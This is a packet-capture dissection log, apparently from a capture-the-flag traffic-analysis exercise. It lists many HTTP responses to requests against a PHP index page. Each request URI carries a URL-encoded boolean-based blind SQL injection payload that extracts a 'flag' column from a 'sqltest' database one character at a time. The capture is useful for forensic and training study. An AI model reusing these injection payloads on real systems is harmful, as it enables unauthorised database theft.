+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37876, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.022164182 seconds]
+    [Request in frame: 1260]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C7%2C1%29%29%3E112]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1307 50.005597511   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1307: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37882, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.022481157 seconds]
+    [Request in frame: 1302]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C8%2C1%29%29%3E96]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1323 50.062901741   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1323: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37888, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.022224462 seconds]
+    [Request in frame: 1320]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C8%2C1%29%29%3E104]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1343 50.137698484   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1343: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37894, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021468975 seconds]
+    [Request in frame: 1341]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C8%2C1%29%29%3E106]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1350 50.163770799   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1350: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37892, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.020144211 seconds]
+    [Request in frame: 1347]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C8%2C1%29%29%3E107]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1370 50.236887745   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1370: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37900, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021195210 seconds]
+    [Request in frame: 1368]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E48]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1377 50.263635425   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1377: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37898, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021102797 seconds]
+    [Request in frame: 1374]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E72]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1386 50.295123522   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1386: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37902, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021919256 seconds]
+    [Request in frame: 1383]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E84]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1397 50.343568772   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1397: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37906, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021511397 seconds]
+    [Request in frame: 1395]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E90]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1406 50.372483103   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1406: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37904, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.023130053 seconds]
+    [Request in frame: 1401]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E93]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1413 50.400612232   47.94.6.19            172.24.11.132         HTTP     1190   HTTP/1.1 200 OK  (text/html)
+
+Frame 1413: 1190 bytes on wire (9520 bits), 1190 bytes captured (9520 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37908, Seq: 1, Ack: 368, Len: 1136
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 943\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021703430 seconds]
+    [Request in frame: 1410]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C9%2C1%29%29%3E94]
+    File Data: 943 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1433 50.485912987   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1433: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37914, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:43 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.025359727 seconds]
+    [Request in frame: 1431]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E64]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1440 50.516559204   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1440: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37912, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.023200408 seconds]
+    [Request in frame: 1437]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E96]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1449 50.545389636   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1449: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37916, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021357180 seconds]
+    [Request in frame: 1446]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E112]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1478 50.670176164   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1478: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37924, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.020995331 seconds]
+    [Request in frame: 1476]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E114]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1485 50.699008675   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1485: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37922, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.022961708 seconds]
+    [Request in frame: 1482]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C10%2C1%29%29%3E115]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1494 50.725917022   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1494: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37926, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.020833752 seconds]
+    [Request in frame: 1491]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C11%2C1%29%29%3E96]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1523 50.850760793   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1523: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37934, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.022118382 seconds]
+    [Request in frame: 1521]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C11%2C1%29%29%3E100]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1548 50.932937816   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1548: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37938, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.020998826 seconds]
+    [Request in frame: 1545]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C12%2C1%29%29%3E96]
+    File Data: 944 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1557 50.967885347   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1557: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37940, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.023447800 seconds]
+    [Request in frame: 1554]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C12%2C1%29%29%3E112]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1586 51.077916708   47.94.6.19            172.24.11.132         HTTP     1192   HTTP/1.1 200 OK  (text/html)
+
+Frame 1586: 1192 bytes on wire (9536 bits), 1192 bytes captured (9536 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37948, Seq: 1, Ack: 370, Len: 1138
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 945\r\n
+    Connection: close\r\n
+    Content-Type: text/html; charset=UTF-8\r\n
+    \r\n
+    [HTTP response 1/1]
+    [Time since request: 0.021655705 seconds]
+    [Request in frame: 1584]
+    [Request URI: http://bbs.ambb1.top:5000/index.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28flag_here%20AS%20CHAR%29%2C0x20%29%20FROM%20sqltest.flag%20ORDER%20BY%20flag_here%20LIMIT%200%2C1%29%2C12%2C1%29%29%3E114]
+    File Data: 945 bytes
+Line-based text data: text/html (24 lines)
+
+No.     Time           Source                Destination           Protocol Length Info
+   1604 51.157851044   47.94.6.19            172.24.11.132         HTTP     1191   HTTP/1.1 200 OK  (text/html)
+
+Frame 1604: 1191 bytes on wire (9528 bits), 1191 bytes captured (9528 bits) on interface eth0, id 0
+Ethernet II, Src: Vmware_e2:09:ee (00:50:56:e2:09:ee), Dst: Vmware_fe:64:03 (00:0c:29:fe:64:03)
+Internet Protocol Version 4, Src: 47.94.6.19, Dst: 172.24.11.132
+Transmission Control Protocol, Src Port: 5000, Dst Port: 37952, Seq: 1, Ack: 369, Len: 1137
+Hypertext Transfer Protocol
+    HTTP/1.1 200 OK\r\n
+    Date: Thu, 16 Jul 2020 03:49:44 GMT\r\n
+    Server: Apache/2.2.15 (CentOS)\r\n
+    X-Powered-By: PHP/5.3.3\r\n
+    Content-Length: 944\r\n
+    Connection: close\r\n
